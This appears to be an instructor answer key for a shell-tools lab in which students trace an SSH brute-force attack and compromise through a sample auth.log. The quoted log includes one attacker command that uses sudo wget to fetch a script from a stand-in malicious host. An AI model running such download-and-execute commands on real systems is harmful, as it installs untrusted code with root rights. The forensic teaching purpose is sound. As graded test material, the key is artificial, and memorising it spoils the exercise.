# Instructor Answer Key

Do not hand this out. Outputs below were run against the provided `auth.log` and `users.csv`. If you edit the data files, re-run and update these.

## 1. wc
1. `wc -l auth.log` -> 33
2. `wc -l users.csv` -> 11 (10 users plus 1 header)
3. `grep -c "Accepted" auth.log` -> 5
4. `grep -c "Invalid user" auth.log` -> 4
5. `wc -l` counts every line; `grep -c "text"` counts only lines that contain the text.

## 2. head and tail
1. `head -n 10 auth.log`
2. `tail -n 5 auth.log`
3. `head -n 1 users.csv`
4. The last line is a `sudo` running `wget http://malicious.example/x.sh` as root. It means an attacker with root access is pulling a script from the internet, almost certainly to install malware or a backdoor.
5. Use `tail` to see the most recent events, since logs append newest entries at the bottom. Live incidents use `tail -f`.

## 3. grep
1. `grep "Accepted password" auth.log`
2. `grep -c "root" auth.log` -> 13 (accept any close answer; point is using -c)
3. `grep "203.0.113.42" auth.log`
4. `grep -v "Failed password" auth.log`
5. `grep "Accepted" auth.log | grep "203.0.113.42"` finds it. Line: `Sep 24 06:33:12 web01 sshd[2401]: Accepted password for root from 203.0.113.42 port 40501 ssh2`. The attacker IP finally got a successful login. This is the compromise.

## 4. cut
1. `cut -d, -f2 users.csv`
2. `cut -d, -f3 users.csv`
3. `cut -d, -f1,4 users.csv`
4. `cut -d, -f5 users.csv`
5. `cut -d, -f1 users.csv | tail -n +2`

## 5. sort
1. `cut -d, -f1 users.csv | tail -n +2 | sort`
2. `cut -d, -f2 users.csv | tail -n +2 | sort`
3. `cut -d, -f5 users.csv | tail -n +2 | sort -n`
4. `cut -d, -f5 users.csv | tail -n +2 | sort -rn`
5. Plain `sort` treats numbers as text, so `10` sorts before `2` (because it compares character by character, and `1` comes before `2`). `sort -n` reads them as real numbers.

## 6. uniq
1. `cut -d, -f4 users.csv | tail -n +2 | sort | uniq -c`
2. `grep "Failed password" auth.log | grep -oE "from [0-9.]+" | cut -d' ' -f2 | sort | uniq -c | sort -rn`
3. `203.0.113.42` with 17 failed attempts.
   Full ranking:
   ```
   17 203.0.113.42
    3 198.51.100.7
    3 192.0.2.88
   ```
4. `grep "Failed password" auth.log | grep -oE "for (invalid user )?[a-z]+" | awk '{print $NF}' | sort | uniq -c | sort -rn` (accept any working approach; the targeted names are root, admin, oracle, postgres, test, git)
5. `uniq` only compares each line to the one directly before it. If matching lines are scattered, it will not see them as duplicates. Sorting first pulls all identical lines together.

## 7. tr
1. `sed -n '2p' users.csv | tr ',' '\n'` (or `head -n 2 users.csv | tail -n 1 | tr ',' '\n'`)
2. `echo "ADMIN" | tr 'A-Z' 'a-z'` -> admin
3. `head -n 1 auth.log | tr -d '0-9'`
4. Forcing lowercase lets you match text without worrying about capitalisation, for example matching `Failed`, `failed`, and `FAILED` the same way.

## 8. sed
1. `... | sed 's/Failed/FAIL/'`
2. `sed 's/192\.0\.2\.88/[REDACTED]/' auth.log`
3. `sed -n '/Invalid user/p' auth.log`
4. `sed 's/web01/SERVER/g' auth.log` (the `g` makes it replace all on each line)
5. In regex a dot means "any character." Without the backslash, `1.2.3.4` would also match things like `1x2y3z4`. The backslash forces a literal dot.

## 9. awk
1. `awk -F, 'NR>1 {print $1, $4}' users.csv`
2. `awk -F, 'NR>1 && $5==0 {print $1}' users.csv` -> deploy, deploy, sarah
3. `awk -F, 'NR>1 && $5>=5 {print $1, $5}' users.csv` -> root 14, admin 5
4. `awk '/Failed password/ {print $3, $(NF-3)}' auth.log` (time is field 3, IP is 4th from the end)
5. `awk -F, 'NR>1 {s+=$5; n++} END {print s/n}' users.csv` -> 2.7

## Capstone
1. 23 failed attempts. `grep -c "Failed password" auth.log`
2. `203.0.113.42`, 17 attempts.
3. root, admin, oracle, postgres, git (all hit by that IP).
4. `Sep 24 06:33:12 ... Accepted password for root from 203.0.113.42`. Time 06:33:12, account root.
5. Ran `sudo wget http://malicious.example/x.sh`, downloading a malicious script as root.
6. Model answer: "The host 203.0.113.42 brute-forced SSH for about 20 minutes, hitting root and several service accounts. At 06:33 it succeeded against root, then immediately downloaded a script from an external site, indicating a full compromise and likely malware install."
